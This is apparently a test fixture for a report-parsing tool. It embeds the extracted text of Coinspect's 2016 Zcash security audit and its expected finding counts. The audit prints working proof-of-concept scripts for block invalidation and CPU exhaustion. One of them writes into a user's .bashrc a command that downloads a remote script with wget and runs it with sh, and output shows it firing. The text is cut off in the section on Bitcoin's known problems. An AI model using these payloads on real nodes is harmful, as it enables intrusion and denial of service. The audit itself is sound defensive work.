@@ -1,0 +1,740 @@
+{
+  "manifest": {
+    "id": "coinspect-zcash-2016-source-code-review",
+    "vendor": "Coinspect",
+    "family": "coinspect",
+    "sourceRootEnv": "PUBLIC_REPORT_CORPUS_DIR",
+    "sourcePath": "Coinspect/CoinspectReportZcash2016.pdf",
+    "textPath": "data/golden-reports/extracted-text/coinspect-zcash-2016-source-code-review.txt",
+    "expectedPath": "data/golden-reports/expected/coinspect-zcash-2016-source-code-review.json"
+  },
+  "expected": {
+    "id": "coinspect-zcash-2016-source-code-review",
+    "expectedCount": 11,
+    "expectedSeverityCounts": {
+      "Critical": 0,
+      "High": 2,
+      "Medium": 3,
+      "Low": 6
+    },
+    "notes": [
+      "Promoted from verified Stage 4 V4 review queue.",
+      "Source review id: coinspect-coinspectreportzcash2016-5d1c3c67",
+      "Source path: Coinspect/CoinspectReportZcash2016.pdf",
+      "Info / Informational / Note / Minor findings are normalized to Low by the current app model.",
+      "Major findings are normalized to High by the current app model.",
+      "Requires ENABLE_NLP=true and ENABLE_GENERIC_INDEX_ALIGNMENT=true.",
+      "7ASecurity reports also require ENABLE_7ASECURITY_INDEX_ALIGNMENT=true.",
+      "Do not promote the excluded research / expert-witness / manual-hold reports without separate manual review."
+    ]
+  },
+  "report": {
+    "id": "G-coinspect-zcash-2016-source-code-review",
+    "slug": "coinspect-zcash-2016-source-code-review",
+    "name": "coinspect-zcash-2016-source-code-review",
+    "type": "PDF",
+    "uploadedAt": "2026-06-05T23:31:42.014Z",
+    "owner": "AI CTIX Analyzer",
+    "status": "Ready",
+    "findings": 11,
+    "critical": 0,
+    "high": 2,
+    "medium": 3,
+    "low": 6,
+    "summary": "1. Table of Contents 1. Table of Contents 2. Executive Summary",
+    "parsingStatus": "parsed",
+    "analysisVersion": 1,
+    "parserVersion": 1,
+    "parsingNotes": [
+      "Structured parser found no blocks; heuristic fallback was used.",
+      "NLP hybrid extraction produced 14 finding(s). Heuristic fallback output was suppressed to avoid duplicate findings.",
+      "Aligned findings with generic official index: 14 -> 11."
+    ],
+    "content": "-- 1 of 26 --\n\nSource Code Review\nPrepared for Zcash • October 2016\nV1.5\n1. Table of Contents\n1. Table of Contents\n2. Executive Summary\n3. Introduction\n3.1. Scope\n4. Summary Of Findings\n5. Findings\nZCA-001 - DoS attack if orphan JoinSplit transactions are enabled\nZCA-002 - Inheriting FindAndDelete from Bitcoin is considered dangerous\nZCA-003 - scriptSig malleability allows 51% attack by invalidating honest miners blocks\nZCA-004 - Decrease in huge-reorg security margin\nZCA-005 - Unlimited number of transaction proofs allows CPU-exhaustion attacks\nZCA-006 - Erroneous nValueOut range check allows CPU-exhaustion attacks\nZCA-007 - Forever growing nullifier set will end up being stored in nonvolatile memory\nZCA-008 - Forever growing commitment tree slows down commitment lookup\nZCA-009 - Improper destination path validation in RPC calls allows arbitrary command\nexecution\nZCA-010 - Improper destination file permissions check in RPC calls could expose secret\nkeys\nZCA-011 - Information exposure through log files\n6. Opportunity to fix Bitcoin’s known problems\n6.1. Remove the distinction between mandatory and nonmandatory input validation flags\n6.2. Add a block height field directly to header (apart from the coinbase field)\n6.3. P2SH using scriptSig that is not a script is an aberration of nature\n6.4. Add script versioning\n6.5. Move the height field in the coinbase script field to the coinbase prevout hash field\n6.6. Mask out the must-be-zero bits in the previous-block-hash (block header) so miners\ncan reuse them for nonce space\n6.7. Allow adding additional inputs to generation transactions\n6.8. Include value of TxOut being spent in signature hash\n6.9. Prevent O(n2) hashing attack by serializing only the hashes of inputs and outputs\n6.10. CHECKMULTISIG popping one-too-many items off the stack\n6.11. Extended Scripts opcodes can be enabled, after security audit\n6.12. Include the maximum size of a scriptSig or transaction for each input signature\n\n-- 2 of 26 --\n\n2. Executive Summary\nBetween August and October 2016, Zcash engaged Coinspect to perform a security audit of\ntheir implementation of the Zerocash protocol. The objective of the audit requested by Zcash\nwas to evaluate the security of Zcash's innovations over the Bitcoin Core source code.\nDuring the assessment, Coinspect identified 2 high-risk issues, 3 medium-risk issues, and 6\nlow-risk issues. The high-risk issues identified during the assessment are not remotely\nexploitable by themselves to steal funds or compromise the privacy Zcash users. The high-risk\nand moderate-risk issues identified affect the performance and availability of the p2p network.\n3. Introduction\nZcash is an implementation of the Zerocash protocol based on the Bitcoin Core C++ code. It\nintends to offer a far higher standard of privacy and anonymity through a sophisticated\nzero-knowledge proving scheme which preserves confidentiality of transaction metadata.\nA whitebox security audit was conducted on the Zcash source code in order to detect security,\nprivacy, and availability related problems. Coinspect reviewed Zcash changes to Bitcoin Core,\nincluding their interaction with other parts of the Bitcoin protocol and other parts of the\nimplementation.\nThe present report was completed on October 1st by Coinspect and includes results from the\nfirst and second phase of the audit.\n3.1. Scope\nThe Zcash auditing strategy tasked experts with different specializations to focus on different\naspects of the system.\nThe objective of the first phase of the audit requested Coinspect to review changes to the\nBitcoin Core code, focusing on the “core consensus” pieces. The review included but was not\nlimited to the following checks:\n● JoinSplit operations\n● Transaction validation\n● Founder's Reward\n● Block header changes\n● Transaction signing\n● Input validation\n● Denial of service prevention\n● Integer overflows\n● New data structures\n● Cryptographic weaknesses\n© 2016 Coinspect 1\n\n-- 3 of 26 --\n\nThe objectives of the second phase of the audit included:\n● New RPC interface\n● Wallet encryption\n● Founder’s Reward address rotation\n● Information disclosure\n● Changes made to the consensus code after the first phase concluded.\nThe audit conducted by Coinspect did not include: the zkSNARK cryptographic scheme, the\nlibsnark implementation, or Equihash design.\n© 2016 Coinspect 2\n\n-- 4 of 26 --\n\nSource Code Review\n4. Summary Of Findings\nID Description Risk\nZCA-001 DoS attack if orphan JoinSplit transactions are enabled Low\nZCA-002 Inheriting FindAndDelete from Bitcoin is considered dangerous Medium\nZCA-003 scriptSig malleability allows 51% attack by invalidating honest miners\nblocks\nHigh\nZCA-004 Decrease in huge-reorg security margin Low\nZCA-005 Unlimited number of transaction proofs allows CPU-exhaustion attacks Medium\nZCA-006 Erroneous nValueOut range check allows CPU-exhaustion attacks High\nZCA-007 Forever growing nullifier set will end up being stored in nonvolatile\nmemory\nLow\nZCA-008 Forever growing commitment tree slows down commitment lookup Low\nZCA-009 Improper destination path validation in RPC calls allows arbitrary\ncommand execution\nMedium\nZCA-010 Improper destination file permissions check in RPC calls could expose\nsecret keys\nLow\nZCA-011 Information exposure through log files Low\n© 2016 Coinspect 3\n\n-- 5 of 26 --\n\n5. Findings\nZCA-001 DoS attack if orphan JoinSplit transactions are enabled\nCategory Availability\nTotal Risk Low | Impact: High | Likelihood: Low1 | Effort to Fix: Medium\n-1- Low, as orphans with JoinSplits are currently disabled\nDescription\nInitial expensive verifications in transaction checking allow a DoS attack if orphan transactions\nwith JoinSplits are enabled. In Bitcoin a transaction is checked in stages, first all non-expensive\noperations and finally signatures are verified. This is to prevent a DoS attack discovered circa\n2012 that could be amplified by using orphan transactions. Orphan transactions must be\ndetected using the least amount of CPU. If an orphan transaction X is stored in mapOrphans\nand X depends on an output of the transaction Y and an output of the transaction Z, both\nmissing; then when Y enters the memory pool the reprocessing of X will be triggered. Since X\nstill depends on the missing Z, the transaction will not be evicted from mapOrphans. An attacker\ncan therefore make 10,000 transactions X(i) having vjoinsplit proofs, where each X(i) references\na set of 20 single-output transactions { Y(i) } and an output of the transaction Z. The attacker\nsends all X(i) transaction to a victim node. The node will store all X(i) as orphans. Then the\nattacker sends all transactions Y(i). Each Y(i) will trigger the re-verification of all X(i)\ntransactions. If validation of each vjoinsplit proof takes 10 msec, then for each transaction Y(i)\nreceived by the victim node, it has to spend 100 seconds of processing all dependant X(i)\ntransactions. The attack finishes when all Y(i) transactions have been sent; transaction Z is\nnever sent. The result, in this example, is that the victim node is forced to process transactions\nfor 33 minutes.\nRecommendations\nPossible Solutions:\n● Check vjoinsplit proofs as the last step of transaction validation.\n● Create a proof validation cache.\n● Never enable storage of orphan transactions with vjoinsplit proofs.\n© 2016 Coinspect 4\n\n-- 6 of 26 --\n\nZCA-002 Inheriting FindAndDelete from Bitcoin is considered\ndangerous\nCategory Availability\nTotal Risk Medium | Impact: High | Likelihood: Low | Effort to Fix: Low\nLocation src/script/interpreter.cpp:EvalScript()\nCScript::FindAndDelete()\nFix Pull #1458\nDescription\nEarly Bitcoin implementations used a different scripting evaluation system, involving the\nconcatenation of scriptPub and scriptSig, and then executing the resulting script. That old\nsystem was replaced by the current system, where the two scripts are evaluated one after the\nother using the same stack. However, two software relics from those times were dragged until\ntoday: the CODESEPARATOR opcode and the removal of the signature from the script prior to\nhashing for signature verification. Both have very far reaching consequences that hinder\ncreating a re-implementation of the Bitcoin or Zcash protocols.\nAdditionally, an undisclosed vulnerability reported this year exists that allows an attacker to\nperform a denial of service attack to the whole network abusing these odd protocol relics.\nRecommendations\nRemove the CODESEPARATOR opcode and remove the FindAndDelete() calls in\ninterpreter.cpp.\nReferences\n● Peter Todd - The difficulty of writing consensus critical code: the SIGHASH_SINGLE\nbug. https://decred.org/research/todd2014.pdf\n© 2016 Coinspect 5\n\n-- 7 of 26 --\n\nZCA-003 scriptSig malleability allows 51% attack by invalidating honest\nminers blocks\nCategory Consensus\nTotal Risk High | Impact: High | Likelihood: High | Effort to Fix: Medium\nLocation CTransaction::GetTxid\nFix Issue #1304 Pull #1316\nDescription\nThe new CTransaction::GetTxid method does not include scriptSig fields in the hash calculation,\nallowing attackers to invalidate blocks by modifying the scriptSig fields of its transactions.\nNodes will reject the original valid block as 'duplicate-invalid' after receiving the block modified\nby attackers.\nAdversaries can invalidate blocks of honest miners to mount attacks against the Zcash network.\nThere are several possible attacks using this vector:\n● 51% attack by invalidating all blocks of the remaining miners. The attacker needs good\nnetwork connectivity in order to spread the modified blocks before the honest nodes\nspread the authentic blocks. This can be achieved by quickly announcing them by\ninventory messages, even before the block are fully received or checked.\n● Sybil attacking a node that is downloading historic data of the blockchain. The attacker\ncan send an invalidated historic block in order to prevent the victim from synchronizing\ncorrectly with the best chain\nVulnerability Details\nThe GetTxid method was added to CTransaction in pull request #1144 as an attempt to fix\ntransaction malleability. Calls to CTransaction::GetHash were replaced by calls to GetTxId. The\nscriptSig field of each input CTxIn, and the joinSplitSig field are cleared before calculating the\ndouble SHA256 hash of the transaction.\nThe following Python script, and a zcashd running in regtest mode were used to verify the\nvulnerability. The script requires modified mininode.py and rpcmining.cpp files.\nfrom mininode import CBlock\nfrom StringIO import StringIO\nfrom authproxy import AuthServiceProxy, JSONRPCException\napi = AuthServiceProxy(\"http://username:password@127.0.0.1:18232\")\n© 2016 Coinspect 6\n\n-- 8 of 26 --\n\n#create a transaction\ntoaddr = api.getnewaddress()\napi.sendtoaddress(toaddr,3)\n#regtest generate method modified to return the block without processing it\nblockorig = api.generate(1,False)[0]\ncblockorig = CBlock()\n#decode the returned block\ncblockorig.deserialize(StringIO(blockorig.decode('hex')))\n#invalidate scriptSig, this is only one of the possible ways to do it\ncblockorig.vtx[1].vin[0].scriptSig+='\\xb0'*256\ncblockorig.calc_sha256()\n#show block hash\ncblockorig.hash\n#get last block hash\napi.getbestblockhash()\n#submit modified block\napi.submitblock(cblockorig.serialize().encode('hex'))\napi.getbestblockhash()\n#submit original block\napi.submitblock(blockorig)\napi.getbestblockhash()\nSample Output\nzc@zc:~/zcash.current/zcash/qa/rpc-tests/test_framework$ python\nPython 2.7.6 (default, Jun 22 2015, 17:58:13)\n[GCC 4.8.2] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from mininode import CBlock\n>>> from StringIO import StringIO\n>>> from authproxy import AuthServiceProxy, JSONRPCException\n>>> api = AuthServiceProxy(\"http://username:password@127.0.0.1:18232\")\n>>>\n>>> toaddr = api.getnewaddress()\n>>> api.sendtoaddress(toaddr,3)\nu'f3cc090b818be64eb2350233e52c490f26649b7851df6de37de5395578e89907'\n>>> blockorig = api.generate(1,False)[0]\n>>> cblockorig = CBlock()\n>>> cblockorig.deserialize(StringIO(blockorig.decode('hex')))\n>>> cblockorig.vtx[1].vin[0].scriptSig+='\\xb0'*256\n>>> cblockorig.calc_sha256()\n© 2016 Coinspect 7\n\n-- 9 of 26 --\n\n>>> cblockorig.hash\n'3e184195b9e0b206eb71d66a9947d4617b84f8bd434ab518cd4cef4c7a855349'\n>>> api.getbestblockhash()\nu'6c700501423285843612dd9928f8872739e28245f17399ec429941752733bd21'\n>>> api.submitblock(cblockorig.serialize().encode('hex'))\nu'rejected'\n>>> api.getbestblockhash()\nu'6c700501423285843612dd9928f8872739e28245f17399ec429941752733bd21'\n>>> api.submitblock(blockorig)\nu'duplicate-invalid'\n>>> api.getbestblockhash()\nu'6c700501423285843612dd9928f8872739e28245f17399ec429941752733bd21'\n>>>\nRecommendations\nImplement one of the following proposed solutions:\n● In block headers, introduce a new field “fullTxMerkleTreeRoot” that references a second\nMerkle-Tree, containing the full transaction hashes. The new tree must be also checked\nby the consensus code.\n● Modify the leaves of the original Merkle-Tree to contain two fields {txId,fullTxhash}\ninstead of only the TxId.\n© 2016 Coinspect 8\n\n-- 10 of 26 --\n\nZCA-004 Decrease in huge-reorg security margin\nCategory Consensus\nTotal Risk Low | Impact: Low | Likelihood: Low | Effort to Fix: Low\nFix Issue: #1387\nDescription\nBitcoin has a 100 block maturity lapse for coinbase transactions. Zcash has an average of 2.5\nminutes block interval time, but keeps the 100 maturity rule. The intention of coinbase maturity\nis to prevent transfers from being reverted in case of a huge honest blockchain reorganization.\nSuch a long reorganization, involving 16 hours of rollback has never been seen in the history of\nBitcoin. Examples of events that may trigger a huge reorg event are:\n● Catastrophic network partition due to Internet infrastructure failing (e.g. in case of war,\nET attack, or natural disaster) that force two large components of the network to be\nunconnected for a long period.\n● The late discovery of a bug in the system, after several invalid blocks have been wrongly\naccepted as valid by the network, and only if solving such bug by adding special\nexceptions in the code is not possible. In this case, the users would invalidate the bad\nbranch and let the node memory pools and users reintroduce the transactions they are\naware of.\nThe block maturity serves to increase the fungibility of the cryptocurrency: if a cryptocurrency\ncoinbase maturity is low, then coins derived from recent coinbases will be valued lower, as they\nare at a higher risk of being reverted.\nAnother aspect of coinbase maturity is legal: if a miner pays with recently earned rewards to a\nmerchant and then the network reverts the payment, then it is not clear who is to blame for the\nloss.\nSome cryptocurrencies, such as Ethereum, have no coinbase maturity at all: the user must wait\na longer interval to achieve true fungibility, and the responsibility of waiting long enough lies\nalways on the payment receiver.\nHaving a 2.5 minutes average block interval time and a 100 maturity rule, zCash longest\nreorganization with full replay capabilities of non-anonymous transactions is about 4 hours. In\nZcash, anonymous transactions are anchored to the blockchain and so they have very low block\nmaturity, so it seems that there is no benefit for coinbase maturity. There are several arguments\nfor coinbase maturity even for Zcash. First, if an anonymous transaction is reverted, the payor\nstill has the funds back, so that it could re-issue another transaction (this could be an automatic\nfunctionality of the wallet). In case the payor used recently created funds from a coinbase, it\nmay be the case that the payor does not have the funds anymore. Therefore the coins from\n© 2016 Coinspect 9\n\n-- 11 of 26 --\n\nboth types of payments have different fungibility properties. Zcash increases fungibility using a\ncoinbase maturity period. Second, the coinbase maturity also works as a security deposit:\nminers are discouraged from attacking the network because the earned coins are locked for a\nperiod of time, and an attack may render them less valuable. A long coinbase maturity period,\nwhile also allowing additional inputs in the coinbase transaction, can help Zcash transition from\nproof-of-work to hybrid proof-of-stake/PoW easily. Third, in case of an unexpected hard-fork\ncrisis, it is easier to achieve consensus among the top mining pool maintainers on which fork to\nchoose if the newly generated coins on both competing forks are still locked and have not been\nalready spent (distributed among pool client miners).\nRecommendations\nFour hours has been shown to be the approximate time it takes for a highly qualified team to\nresolve an unexpected hard-fork crisis, so the current 100 block maturity seems enough.\nHowever we recommend increasing the maturity period to one day (576 blocks), to increase the\nsecurity bonding period for miners.\n© 2016 Coinspect 10\n\n-- 12 of 26 --\n\nZCA-005 Unlimited number of transaction proofs allows\nCPU-exhaustion attacks\nCategory Availability\nTotal Risk Medium | Impact: Medium | Likelihood: Medium | Fix: Medium\nLocation src/main.cpp:CheckTransaction()\nFix Issue: #1388\nDescription\nZcash transactions can hold an unlimited number of JoinSplit proofs. The limit is indirectly\nenforced by the maximum block size, which limits the transaction size, which limits the number\nof JoinSplit elements that can be stored in the vjoinsplit vector. Assuming a JoinSplit consumes\n1 Kbyte, a “heavy” transaction can hold 1000 vjoinsplit elements. If verifying a JoinSplit proof\ntakes 10 msec, then verifying the heavy transaction would take 10 seconds. During this period\nthe main lock of zcashd is held, so no other transaction can be processed. Therefore such\ntransaction could be used to lock a node with a CPU-exhaustion attack. If the transaction is\ninvalid because the last proof does not verify, then the transaction will not be broadcast and the\nattacker can use the same transaction to attack another node. If the transaction is valid, then\nthe attacker can send a set of heavy transactions to the network at different entry points and\nforce the network to be locked for long periods.\nRecommendations\nConsider implementing one or more of the following suggestions:\n● Move the verification of JoinSplit proofs to the last step of transaction verification.\n● Make a transaction with more than 10 JoinSplit proofs non-standard.\n● Increase the fees nodes and miners require for each JoinSplit element.\n● Count each JoinSplit proof as a 10 sigops (block maximum is 20K sigops)\n© 2016 Coinspect 11\n\n-- 13 of 26 --\n\nZCA-006 Erroneous nValueOut range check allows CPU-exhaustion\nattacks\nCategory Input Validation\nTotal Risk High | Impact: High | Likelihood: High | Effort to Fix: Low\nLocation src/main.cpp:CheckTransactionWithoutProofVerification()\nFix Issue #1319 Pull #1341\nDescription\nThe value that a transaction creates corresponds to the sum of all Bitcoin-like outputs, plus the\nit->vpub_old fields of all vjoinsplit elements, as specified by CTransaction::GetValueOut().\nHowever, CheckTransactionWithoutProofVerification() in main.cpp performs the following check:\n// Ensure that joinsplit values are well-formed\nBOOST_FOREACH(const JSDescription& joinsplit, tx.vjoinsplit)\n{\n(...)\nnValueOut += joinsplit.vpub_new;\nif (!MoneyRange(nValueOut)) {\nreturn state.DoS(100, error(\"CheckTransaction(): txout total\nout of range\"),REJECT_INVALID, \"bad-txns-txouttotal-toolarge\");\n}\n}\nThe code should add “joinsplit.vpub_old“ instead of “joinsplit.vpub_new“. The error may have\nbeen caused because the names “vpub_old” and “vpub_new” are confusing.\nVulnerability Details\nCTransaction::GetValueOut() throws a \"value out of range\" exception when the total output\nvalue of a transaction is less than zero or more than MAX_MONEY.\nAttackers can continuously send the same out-of-range transaction to a target node without\nbeing banned. The CPU-intensive zk-SNARK verification is executed before the first invocation\nof GetValueOut, fromNonContextualCheckInputs.\nThe attack was tested by sending the same transaction 10,000 times against a local node. The\ndata was sent in seconds but zcashd needed 8 minutes to process the transactions using 100%\nCPU.\nThe transactions created with the following Python script pass all the CheckTransaction\nvalidations and the JoinSplit verification.\n© 2016 Coinspect 12\n\n-- 14 of 26 --\n\n#!/usr/bin/python\nfrom StringIO import StringIO\nfrom test_framework.authproxy import AuthServiceProxy, JSONRPCException\nfrom test_framework.mininode import CTransaction, CTxOut\nfrom random import getrandbits\nfrom sys import stderr\nMAX_COIN = 21000000*100000000\nscriptPubKey = '76a914'+'%040x'%getrandbits(160)+'88ac'\nscriptPubKey = scriptPubKey.decode('hex')\napi = AuthServiceProxy(\"http://username:password@127.0.0.1:18232\")\nzcaddress = api.zcrawkeygen()[\"zcaddress\"]\n#create a transaction without inputs and a single max value output\nmtx = CTransaction()\nmtx.vout.append(CTxOut(MAX_COIN,scriptPubKey))\nmtx_raw = mtx.serialize().encode('hex')\nprint >> stderr, \"Calling zcrawjoinsplit ..\"\njs = api.zcrawjoinsplit(mtx_raw, {}, {zcaddress:0.001}, 0.001, 0.0)\nprint >> stderr, \"Signing ..\"\nmtx_sig = api.signrawtransaction(js[\"rawtxn\"])[\"hex\"]\njstx = CTransaction()\njstx.deserialize(StringIO(mtx_sig.decode('hex')))\nprint >> stderr, jstx\nprint mtx_sig\nopen('./tx_maxout', 'wb').write(mtx_sig)\nRecommendations\nCorrect the code and consider renaming the “vpub_old” and “vpub_new” fields to less confusing\nnames.\n© 2016 Coinspect 13\n\n-- 15 of 26 --\n\nZCA-007 Forever growing nullifier set will end up being stored in\nnonvolatile memory\nCategory Performance\nTotal Risk Low | Impact: Low | Likelihood: Low | Effort to Fix: Low\nLocation src/txdb.cpp\nFix Issue: #1390\nDescription\nEach Zcash transaction that contains a JoinSplit proof add two nullifier items to the nullifiers\npool. Every nullifier must be kept forever to prevent double-spends. If the nullifier list becomes\ntoo large, transaction processing will be slowed down by external storage access.\nRecommendations\nTo prevent such situation, one or more bloom filters could be used to test nullifiers before\nlooking into the nullifier pool. If bloom filters returns false, then no further expensive lookup is\nrequired. If a bloom filter returns true, expensive disk accesses can be performed to get the\naccurate result.\n© 2016 Coinspect 14\n\n-- 16 of 26 --\n\nZCA-008 Forever growing commitment tree slows down commitment\nlookup\nCategory Performance\nTotal Risk Low | Impact: Low | Likelihood: Low | Effort to Fix: Medium\nLocation CWallet::WitnessNoteCommitment()\nFix Issue: #1391\nDescription\nThe function WitnessNoteCommitment() scans every block, every transaction and every\nJoinSplit proof to lookup commitments and create the Merkle witnesses. Blocks are read from\ndisk. This linear process is inefficient and will soon become slow.\nRecommendations\nMaintain a data structure that allows more efficient lookup and construction of Merkle witnesses.\nThis could be achieved by storing in a separate cache file the sequence of note commitments\nassociated with the best chain for blocks older than the current tip height minus 100.\n© 2016 Coinspect 15\n\n-- 17 of 26 --\n\nZCA-009 Improper destination path validation in RPC calls allows\narbitrary command execution\nCategory Input Validation\nTotal Risk Medium | Impact: High | Likelihood: Low | Effort to Fix: Medium\nLocation rpcdump.cpp\nFix Issue: #1497\nDescription\nAuthenticated RPC users can use the z_exportwallet, dumpwallet, and backupwallet\nmethods to create or overwrite existing files in any location of the system accessible by the\nzcashd daemon. An attacker may be able to overwrite or create critical files, such as\nconfiguration files or scripts.\nFor example, the following files in Linux systems: ~/.bashrc, ~/.ssh/authorized_keys,\n~/.zcash/zcash.conf.\nAlthough the attacker does not completely control the data written, the method importprivkey\ncan be used to set the label of transparent addresses to any text string. Setting a label is\nenough to achieve arbitrary command execution as demonstrated below.\n#!/usr/bin/python\n# Copy to zcash/qa/rpc-tests\nfrom test_framework.authproxy import AuthServiceProxy, JSONRPCException\n#label=\"\\nblocknotify={wget,--no-check-certificate,https://paste.ee/r/u7b5s};{sh,u7b5s}\"\nlabel = ';{wget,--no-check-certificate,https://paste.ee/r/u7b5s};{sh,u7b5s}'\napi = AuthServiceProxy('http://username:password@127.0.0.1:18232')\napi.importprivkey('cPE4h5Au9xmrgc8fCQuZYC2JqqZmmy4UovTbfAy1xKQhk83kFThW',label)\napi.z_exportwallet('/home/admin/.bashrc')\nA shell script file is downloaded and executed the next time the node's administrator logs into\nthe system\n$ ssh admin@zcashnode\nWelcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.18.26-guest-4-4751b4a-x86_64 x86_64)\nLast login: Fri Oct 07 15:49:35 2016 from 130.347.450.56\n-bash: cPE4h5Au9xmrgc8fCQuZYC2JqqZmmy4UovTbfAy1xKQhk83kFThW: command not found\n--2016-10-07 15:50:31-- https://paste.ee/r/7DVvf\nResolving paste.ee (paste.ee)... 2400:cb00:2048:1::6812:3114, 2400:cb00:2048:1::6812:3014,\n© 2016 Coinspect 16\n\n-- 18 of 26 --\n\n104.18.48.20, ...\nConnecting to paste.ee (paste.ee)|2400:cb00:2048:1::6812:3114|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: unspecified [text/plain]\nSaving to: '7DVvf'\n[ <=> ] 47 --.-K/s in 0s\n2016-10-07 15:50:31 (5.19 MB/s) - '7DVvf' saved [47]\nAll your coinz are belong to uz\n-bash: cPPiJvCfkiYk71igZwm8TXVFe5r5ZW7E2e5spXnCEX9kvLMrBZsr: command not found\n-bash: cQ6ZvfJoSNE8TXAy2LgoVok8f36gGdrAjfiVdu3sBxFTosPcBhE3: command not found\n-bash: cPW4FfcTm9hYCmvrfEnspbzg5MqzbYKgsM9Yrm29v42cUWYN1L5z: command not found\n-bash: cUww2V8RKDAiFi6YcEzLWb57wBb4SoT7HU2D226fwkmkLbQTRR6A: command not found\n-bash: cQDRXgmuqHig7qppZf5j8Wid3zNp3V8BWF41o1ByMVE64NUha1Vh: command not found\n( ... )\nadmin@zcash:~$\nInstead of waiting for the administrator to log in, attackers can try to overwrite\n~/.zcash/zcash.conf including a blocknotify=command line and execute commands every\ntime the best block changes. New line characters are escaped in the file created by\nz_exportwallet but a workaround could be found.\nAdversaries with RPC access can empty the wallet, but executing commands allows them to\nmaintain access to the system and wait for the wallet balance to increase before emptying it.\nExecuting commands also allow attackers to persist on the system to collect information to\nde-anonymize future transactions.\nThe risk is higher if zcashd’s RPC interface is used in web and mobile wallets back-ends to\ncreate transactions.\nBitcoin wallets back-ends often use bitcoind’s RPC with wallet functionality disabled to query\npublic blockchain information; but we can expect the first Zcash web and mobile wallets to use\nzcashd’s RPC with wallet functions enabled to make transactions if alternative implementations\nof Zcash are not available.\nRecommendations\nDo not allow to overwrite existing files and restrict the creation of new files. Consider returning\nthe wallet data in a JSON response instead of writing to the file system.\n© 2016 Coinspect 17\n\n-- 19 of 26 --\n\nZCA-010 Improper destination file permissions check in RPC calls\ncould expose secret keys\nCategory Data Confidentiality\nTotal Risk Low | Impact: Low | Likelihood: Low | Effort to Fix: Low\nLocation rpcdump.cpp\nDescription\nAuthenticated RPC users can use the z_exportwallet, dumpwallet, and backupwallet\nmethods to make copies of wallet data including secret keys. The permissions of pre-existing\ndestination files are not checked by zcashd before overwriting them. If the access permissions\nof existing files are too open, secrets key will be exposed to other users of the system.\nRecommendations\nDo not allow users to overwrite existing files with wallet copies. Set appropriate file permissions\nfor new wallet copies and check the permissions of the parent folders to avoid write and read\naccess from unintended users.\n© 2016 Coinspect 18\n\n-- 20 of 26 --\n\nZCA-011 Information exposure through log files\nCategory Data Confidentiality\nTotal Risk Low | Impact: Low | Likelihood: Low | Effort to Fix: Low\nLocation asyncoperation_sendmany.cpp, rpcdump.cpp\nFix Issue: #1504\nDescription\nPrivate addresses and Information of protected transactions including plaintext of memo fields\nare logged to ~/.zcash/*/debug.log, a log file in persistent storage that is not necessarily\nencrypted.\nsrc/wallet/rpcdump.cpp:308\n307\n308\n..\n..\n312\nif (pwalletMain->HaveSpendingKey(addr)) {\nLogPrintf(\"Skipping import of zaddr %s (key already present)\\n\",\nCZCPaymentAddress(addr).ToString());\nLogPrintf(\"Skipping import of zaddr %s (key already present)\\n\",\nCZCPaymentAddress(addr).ToString());\nsrc/wallet/asyncrpcoperation_sendmany.cpp:115,761\n113\n114\n115\n..\n761\n..\n..\n767\nstd::string s = strprintf(\"async rpc %s finished (status=%s\", getId(),\ngetStateAsString());\nif (success) {\ns += strprintf(\", tx=%s)\\n\", tx_.ToString());\nLogPrint(\"asyncrpc\", \"%s: found unspent note (txid=%s, vjoinsplit=%d, ciphertext=%d,\namount=%s, memo=%s)\\n\",\ngetId().substr(0, 10),\nentry.jsop.hash.ToString().substr(0, 10),\nentry.jsop.js,\nint(entry.jsop.n), // uint8_t\nFormatMoney(entry.plaintext.value, false),\nHexStr(data).substr(0, 10)\n© 2016 Coinspect 19\n\n-- 21 of 26 --\n\nRecommendations\nDo not log to persistent storage z-addresses or information of transactions made by the user.\n© 2016 Coinspect 20\n\n-- 22 of 26 --\n\n6. Opportunity to fix Bitcoin’s known problems\nAs Zcash does not need to be compatible with Bitcoin, launching Zcash creates the opportunity\nto fix old and known problems in the Bitcoin protocol. Also it creates the opportunity to remove\nunnecessary complexity that can lead to future attacks.\nHere is a list of known problems and the reasons why fixing them is important.\n6.1. Remove the distinction between mandatory and nonmandatory input\nvalidation flags\nBitcoin underwent a number of restrictions on transactions to prevent different attacks.\nTransactions relayed by the network must pass stricter checks than transactions that are\nincluded in blocks. This leads to increased complexity in code. But miners are still allowed to\ninclude transactions that may lead to malleability and DoS attacks. For instance, the\nSCRIPT_VERIFY_CLEANSTACK flag is not part of the consensus code, and in conjunction\nwith non-signed scriptSig directly opens the network to transaction malleability by miners (but\nmaintaining the same TxID).\nAt least the following flags should become mandatory:\n● SCRIPT_VERIFY_DERSIG\n● SCRIPT_VERIFY_STRICTENC\n● SCRIPT_VERIFY_CLEANSTACK\n● SCRIPT_VERIFY_CHECKLOCKTIMEVERIFY\n● SCRIPT_VERIFY_LOW_S\n6.2. Add a block height field directly to header (apart from the coinbase\nfield)\nBitcoin downloads the block headers and, depending on the headers, it downloads block\ncontents. Having no sense of the height of a received header restricts the set of protocols that\ncan be used for this purpose. Without height information, orphan headers are of no value\nbecause they can be replays of past orphan blocks. Therefore the block height field should be\nadded to the block header.\nThis does not mean that the header should be removed from the coinbase field, since the height\nis needed to prevent the creation of duplicate UTXOs.\n6.3. P2SH using scriptSig that is not a script is an aberration of nature\nP2SH was created because OP_EVAL (a competing and cleaner approach) raised questions\nabout the possibility to exploit it by DoS using recursion. Re-implementing OP_EVAL on Zcash\nwith limited recursion would provide the the same functionality while keeping the scripting\n© 2016 Coinspect 21\n\n-- 23 of 26 --\n\nsystem free of exceptions. The drawback of this approach is that Bitcoin wallets that use P2SH\nwould need changes to adapt to the OP_EVAL model.\nA middle-ground solution would be to add to transaction outputs a bit “scriptSigIsP2SH” that\nmarks an output as P2SH without the need to interpret the script format.\nIf scriptSigISP2SH bit is true, then the scriptSig would not be interpreted as a script, but as\narbitrary data in the format “OP_HASH160 20 [20 byte hash] OP_EQUAL”.\n6.4. Add script versioning\nSegwit for Bitcoin provides a system to upgrade the scripting system as soft-forks. Zcash could\nallow the same functionality without segwit’s complexity by adding a single byte “scriptVersion”\nper output. The same byte could hold in its 7th bit the flag scriptSigISP2SH.\n6.5. Move the height field in the coinbase script field to the coinbase\nprevout hash field\nThe coinbase script field was originally un-formatted, so the height had to be encoded as a\nscript value (BIP 34). This is unnatural and complicates parsing. Since the coinbase prevout\nhash consists of all zeros, it’s much preferable to encode the height in the 4 least significant\nbytes of the prevout hash and update the definition of coinbase transaction based on masking\nthe last 4 